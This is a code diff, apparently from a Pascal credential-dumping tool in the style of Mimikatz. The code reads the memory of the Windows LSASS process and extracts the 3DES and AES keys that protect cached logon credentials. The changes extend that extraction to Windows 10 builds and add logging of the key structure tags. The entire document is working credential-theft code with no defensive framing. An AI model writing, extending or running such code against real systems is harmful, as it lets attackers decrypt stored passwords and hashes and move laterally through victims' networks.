@@ -281,15 +281,15 @@ if ReadMem(hprocess, desOffset, @keyPointer, sizeof(keyPointer))=false then writ
 //writeln('keyPointer:'+inttohex(keyPointer,sizeof(pointer)));
 // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
 if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=false then writeln('readmem=false');
-//writeln('TAG:'+strpas(h3DesKey.tag ));
+log('TAG:'+strpas(h3DesKey.tag ));
 // Read in the 3DES key
 log('DES:');
-if winver='6.3.9600' then
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    begin
    //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
    //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
    if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
-   //writeln('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
+   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
    //writeln('hardkey cbSecret:'+inttostr(extracted3DesKey81.hardkey.cbSecret   ));
    //for i:=0 to extracted3DesKey81.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey81.hardkey.data[i],2));;
    setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
@@ -299,6 +299,7 @@ if winver='6.3.9600' then
    else
    begin
    if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey, sizeof(KIWI_BCRYPT_KEY))=false then writeln('readmem=false');
+   log('KIWI_BCRYPT_KEY:'+strpas(extracted3DesKey.tag ));
    //for i:=0 to extracted3DesKey.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey.hardkey.data[i],2));;
    setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
    copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
@@ -324,12 +325,12 @@ ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
 // Read in AES key
 log('AES:');
 
-if winver='6.3.9600' then
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    begin
    //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
    //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
    if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
-   //writeln('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
+   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
    //writeln('hardkey cbSecret:'+inttostr(extracted3DesKey81.hardkey.cbSecret   ));
    //for i:=0 to extractedAesKey81.hardkey.cbSecret -1 do write(inttohex(extractedAesKey81.hardkey.data[i],2));;
    setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
@@ -339,6 +340,7 @@ if winver='6.3.9600' then
    else
    begin
    ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey, sizeof(KIWI_BCRYPT_KEY));
+   log('BCRYPT_KEYTAG:'+strpas(extractedAesKey.tag ));
    //for i:=0 to extractedAesKey.hardkey.cbSecret -1 do write(inttohex(extractedAesKey.hardkey.data[i],2));;
    setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
    copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
